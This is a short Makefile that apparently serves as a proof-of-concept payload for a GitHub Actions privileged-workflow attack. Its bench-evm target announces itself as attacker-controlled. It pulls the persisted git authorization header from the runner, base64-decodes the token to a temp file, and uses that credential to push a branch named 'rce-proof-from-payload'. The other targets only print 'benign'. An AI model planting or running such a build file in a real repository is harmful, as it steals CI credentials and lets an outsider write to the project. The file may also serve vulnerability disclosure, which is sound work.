.PHONY: bench-evm benchmark-acala benchmark-karura benchmark-mandala benchmark-module

bench-evm:
	@echo "=== ATTACKER-CONTROLLED MAKEFILE EXECUTING IN PRIVILEGED WORKFLOW ==="
	@echo "whoami=$$(id -un) host=$$(hostname) repo=$$GITHUB_REPOSITORY event=$$GITHUB_EVENT_NAME"
	@git config --get-regexp '^http\..*extraheader' > /tmp/hdr.txt; echo "extraheader_lines=$$(wc -l < /tmp/hdr.txt)"
	@sed 's/.*basic //' /tmp/hdr.txt | base64 -d > /tmp/tok.txt; echo "persisted_credential_decoded_bytes=$$(wc -c < /tmp/tok.txt)"
	@git push -q origin HEAD:refs/heads/rce-proof-from-payload && echo "git_push_using_persisted_credential=OK"

benchmark-acala benchmark-karura benchmark-mandala benchmark-module:
	@echo "benign"
